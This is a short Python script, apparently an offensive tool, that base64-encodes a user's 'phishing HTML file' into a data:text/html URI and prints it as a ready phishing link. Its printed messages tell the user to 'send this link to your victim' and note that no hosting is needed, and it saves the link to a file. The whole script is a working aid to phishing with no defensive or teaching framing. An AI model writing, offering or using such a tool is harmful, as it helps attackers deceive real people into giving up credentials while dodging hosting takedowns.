import base64

def create_data_uri():
    html_path = input("Enter path to your phishing HTML file: ").strip()

    try:
        with open(html_path, "rb") as f:
            html_content = f.read()
    except Exception as e:
        print(f"[-] File error: {e}")
        return

    encoded = base64.b64encode(html_content).decode('utf-8')
    data_uri = f"data:text/html;base64,{encoded}"

    print("\n🔗 Your Data URI Phishing Link:\n")
    print(data_uri)
    print("\n✅ Copy and send this link to your victim. No hosting required!")

    # ✅ Optionally save to file
    with open("data_uri_link.txt", "w") as out:
        out.write(data_uri)
    print("[+] Saved as data_uri_link.txt")

